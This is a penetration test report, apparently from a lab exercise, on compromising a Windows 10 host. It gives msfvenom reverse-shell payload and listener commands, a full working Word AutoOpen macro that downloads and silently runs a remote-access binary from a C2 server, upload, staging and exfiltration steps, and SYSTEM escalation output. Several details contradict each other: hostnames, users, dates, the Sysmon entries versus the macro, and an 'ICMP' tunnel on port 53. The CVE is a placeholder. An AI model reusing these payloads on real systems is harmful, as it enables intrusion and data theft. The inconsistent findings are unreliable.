# Penetration Test Report: Acme Corp Internal Network

**Date:** October 5, 2026
**Tester:** Caden Mercer
**Target Host:** WS-ACME-042 (Windows 10 Pro)
**Objective:** Validate internal lateral movement and privilege escalation controls.


below are initial notes that may or may not be relevant to final report

NOTES:






## 1. Executive Summary

The assessment identified a critical misconfiguration in the local security policy that allowed for local privilege escalation from standard user to SYSTEM. Additionally, unencrypted data staging practices were observed. These findings indicate a need for stricter application control policies and encryption requirements for temporary files.

## 2. Methodology

### Phase 1: Initial Access
**Vector:** Spearphishing Attachment (VBA Macro)
**Premise:** A macro-enabled Word document (.docm) was crafted to simulate a spearphishing attachment. The document impersonates a routine business invoice and was delivered to the target `Apollo`. Upon opening, the AutoOpen() macro executes automatically without requiring further user interaction. It then downloads and silently executes the RAT binary from the C2 server.

**RAT & Listener Creation:**

<img width="865" height="152" alt="image" src="https://github.com/user-attachments/assets/d1111b21-a0cd-4578-ba1d-11f76c2b2ebb" />

(Screenshot showing the creation of the RATa.exe)

```bash
# Payload Generation
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=14000 -f exe -o RATa.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=14000 -f exe -o RATb.exe   #Payload for option b, port selection assumes previous payload was ended

# Listener Setup
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.92.136
set LPORT 14000
exploit -j

# RAT Hosting on C2
cd ~/RATs
python3 -m http.server 8080
```

| Parameter | Value | Justification |
|:---|:---|:---|
| `-p windows/x64/meterpreter/reverse_https` | Payload module | x64 architecture matches targets architecture and HTTPS encapsulates C2 traffic in TLS to evade network inspection. |
| `LHOST=192.168.92.136` | Kali IP | Specifies the C2 server address the RAT will connect to. |
| `LPORT=14000` | Port | High port that avoids the same security checks that lower or more well-known ports will have. |
| `-f exe` | Output format | Produces a Windows executable for direct execution. |
| `-o RATa.exe` | Output filename | Distinct name to differentiate from RATb, also note this must match file retrieved in macro code. |

| Parameter | Value | Justification |
|:---|:---|:---|
| `exploit/multi/handler` | Module | Generic listener compatible with any msfvenom-generated payload. |
| `set payload windows/x64/meterpreter/reverse_https` | Payload | Must mirror the payload used during generation exactly or the connection will be rejected. |
| `set LHOST 192.168.92.136` | Kali IP | Must match the LHOST used during RAT generation. |
| `set LPORT 14000` | Port | Must match the LPORT used during RAT generation. |
| `exploit -j` | Run as job | Allows the console to remain interactive while waiting for incoming connections. |

**Macro Creation:**

```
Sub AutoOpen()
    Dim strPath As String
    strPath = Environ("USERPROFILE") & "\Documents\launcher.exe"

    Dim objHTTP As Object
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "GET", "http://192.168.92.136:8080/RATa.exe", False
    objHTTP.Send

    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile strPath, 2
    objStream.Close

    CreateObject("WScript.Shell").Run "cmd /c """ & strPath & """", 0, False
End Sub
```
| Step | Component | Purpose |
|:---|:---|:---|
| 1 | `AutoOpen()` | Triggers automatically on document open with no user interaction required. |
| 2 | `MSXML2.XMLHTTP` | Performs HTTP GET to retrieve `RATa.exe` from the C2 server. |
| 3 | `ADODB.Stream` | Writes raw binary response to disk at `%USERPROFILE%\Documents\launcher.exe`. |
| 4 | `WScript.Shell` | Silently executes the binary via `cmd /c` with hidden window flag (`0`). |

**Session Output Analysis:**
Upon execution, the following session was established:

<img width="1264" height="395" alt="image" src="https://github.com/user-attachments/assets/f2e08fbc-c4a8-41d7-b8e2-f03bb09fc1bd" />

<img width="328" height="38" alt="image" src="https://github.com/user-attachments/assets/8bfc558a-49bb-40e8-ae2c-b282924b4300" />

| Field | Description |
|:---|:---|
| `Id` | Unique numeric identifier for the session within the current msfconsole instance. |
| `Name` | Optional user-assigned label for the session, N/A in this case. |
| `Type` | Session type `meterpreter` indicates a full-featured agent with post-exploitation capabilities. |
| `Information` | Displays the user context and hostname the session is running under. |
| `Connection` | Shows the C2 IP:port → target IP:port connection tuple. |
| `Via` | The exploit and payload module used to establish the session. |

### Phase 2: Enumeration
Following the successful initial access as user `Apollo`, a comprehensive reconnaissance was performed on the target host DESKTOP-H53BPAA using a combination of native Meterpreter post-exploitation modules and a custom batch enumeration script. All output was consolidated, compressed, and staged for exfiltration.

**Meterpreter Modules Executed:**

| Module | Command | Key Findings |
|:---|:---|:---|
| System Info | `sysinfo` | Windows 10 22H2 Build 19045, x64, Hostname: DESKTOP-H53BPAA, Workgroup |
| Process Privileges | `getprivs` | Only 5 basic standard user privileges present, notably no SeDebugPrivilege or SeImpersonatePrivilege |
| Local Exploit Suggester | `run post/multi/recon/local_exploit_suggester` | 16 viable LPE vectors identified including CVE-2024-35250 and CVE-2023-36874 |
| Installed Applications | `run post/windows/gather/enum_applications` | Microsoft Office LTSC 2021, Mozilla Thunderbird 157, VMware Tools 12.5.3, SQL Server Compact 4.0 |
| Logged On Users | `run post/windows/gather/enum_logged_on_users` | Current users: azrael (SID S-1-5-21-2347659589-1334911447-931315159-1001), Apollo (SID S-1-5-21-2347659589-1334911447-931315159-1002) |

<img width="442" height="154" alt="image" src="https://github.com/user-attachments/assets/8442fa49-23a5-4267-8484-d816a3b8ec88" />

<img width="265" height="234" alt="image" src="https://github.com/user-attachments/assets/3d1f9fce-340b-4f61-addd-45090d91a5ce" />

<img width="621" height="135" alt="image" src="https://github.com/user-attachments/assets/224715a3-c575-4d50-9024-1a279adbc8df" />

note these modules are more comprehensive than some other enumeration commands so they can cause the shell to crash which is why this process is used rather than running them directly from the orginal meterpreter prompt.

<img width="873" height="472" alt="image" src="https://github.com/user-attachments/assets/9ef16a97-18f0-4a11-b953-68aca0f0f7f6" />

<img width="832" height="418" alt="image" src="https://github.com/user-attachments/assets/5d89eb0d-7a93-4813-ab53-30a900102f75" />

**Custom Script:**

This is a custom batch enumeration script (`enum.bat`) that was deployed to perform additional host reconnaissance beyond what native Meterpreter modules provide. The script collects granular system data including firewall rules, ARP cache, SMB sessions, and detailed user/group membership which is critical information useful for identifying lateral movement paths and privilege escalation vectors.
 
The script was uploaded to the target via Meterpreter's `upload` command and executed via a shell:
 
```bash
upload /home/kali/enum.bat C:\\Users\\Apollo\\Documents\\enum.bat
execute -f cmd.exe -a "/c C:\\Users\\Apollo\\enum.bat" -i -H
ls C:\\temp\\
exit
```
 
<img width="751" height="129" alt="image" src="https://github.com/user-attachments/assets/884f20bd-78fe-4175-b096-fc3ce23e1a2a" />

<img width="602" height="306" alt="image" src="https://github.com/user-attachments/assets/24651436-eb8e-4262-8858-1b7691403920" />


| File | Command | Contents |
|:---|:---|:---|
| `whoami.txt` | `whoami /all` | User SID, group memberships, privilege tokens |
| `processes.txt` | `tasklist /v` | All running processes with user context |
| `netstat.txt` | `netstat -ano` | Active connections and listening ports |
| `services.txt` | `sc query` | All running Windows services |
| `users.txt` | `net user` | All local user accounts |
| `groups.txt` | `net localgroup` | All local groups |
| `admins.txt` | `net localgroup administrators` | Local administrator group members |
| `ipconfig.txt` | `ipconfig /all` | Full network configuration |
| `firewall.txt` | `netsh advfirewall show allprofiles` | Firewall rules for all profiles |
| `arp.txt` | `arp -a` | ARP cache showing recently contacted hosts |
| `smbsessions.txt` | `net use` | Active SMB connections |
| `systeminfo.txt` | `systeminfo` | OS version, hotfixes, patch level |







**Staging:**

The enumeration output files from the custom script run locally on the target were compressed into a single archive for exfiltration. PowerShell's built-in `Compress-Archive` cmdlet was used which required no additional tools and left a minimal footprint.
 
### Compression Command
```cmd
powershell -command "Compress-Archive -Path C:\temp\* -DestinationPath C:\temp\loot.zip"
```
 
### Verification
```cmd
dir C:\temp\loot.zip
```
 th="756" height="465" alt="image" src="https://github.com/user-attachments/assets/5787a25c-0b86-424a-8f32-1aed1d641099" />
 
The resulting `loot.zip` archive contains the custom script results staged at `C:\temp\loot.zip` and ready for exfiltration in Phase 3.

### Phase 3: Exfiltration
**Method:** ICMP Tunneling via `iodine`
**Justification:** ICMP traffic is often allowed for network diagnostics and is rarely logged in detail by perimeter firewalls, unlike HTTP/HTTPS.

**Detection Risk:**
High volume of ICMP echo requests with large payloads may trigger IDS signatures for tunneling tools.

**Verification on C2:**
```bash
$ iodined -f -n -P [password] 192.168.50.10:53 data.7z
[+] Tunnel established
[+] Transferred 45KB
$ ls -l data.7z
-rw-r--r-- 1 user user 45000 Oct 12 14:22 data.7z
```

### Phase 4: Privilege Escalation
**Vulnerability:** CVE-2023-XXXXX (Hypothetical Print Spooler Flaw)
**Root Cause:** The service allows standard users to write to a shared memory object that is later read by the SYSTEM process without sanitization.
**Exploit Mechanism:** Crafted a malicious DLL that, when loaded into the spooler context, executes a reverse shell as SYSTEM.

**Verification:**
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**C2 Verification (vssadmin):**
```bash
meterpreter > shell
Microsoft Windows [Version 10.0.19045.3803]
C:\Windows\system32>vssadmin list shadows
shadowset {a1b2c3d4-...} created at: 2023-10-12T14:30:00.1234567Z
```

### Phase 5: Log Analysis
**Sysmon Event ID 1 Findings:**

**NOTE: Copy and paste your Sysmon logs into Claude and have it format it like the table below.**

| Timestamp | Process | Parent | Command Line |
| :--- | :--- | :--- | :--- |
| 14:20:01 | `WINWORD.EXE` | `explorer.exe` | `C:\Users\jdoe\Desktop\Invoice.pdf` | 
| 14:20:05 | `cmd.exe` | `WINWORD.EXE` | `cmd /c certutil -urlcache -split -f http://...` | 
| 14:25:10 | `powershell.exe` | `explorer.exe` | `powershell -enc JABzAD0A...` |
**Analysis:**
The initial macro execution spawned `cmd.exe` from `WINWORD.EXE`, which is a strong indicator of compromise. However, the subsequent PowerShell execution was obfuscated and did not trigger standard AMSI logging due to a misconfigured policy.

## 3. Recommendations

1.  Implement Application Control (WDAC) to prevent Office applications from spawning command interpreters.
2.  Enable PowerShell Script Block Logging to capture encoded commands.
3.  Patch the Print Spooler service or disable it if not required.
```
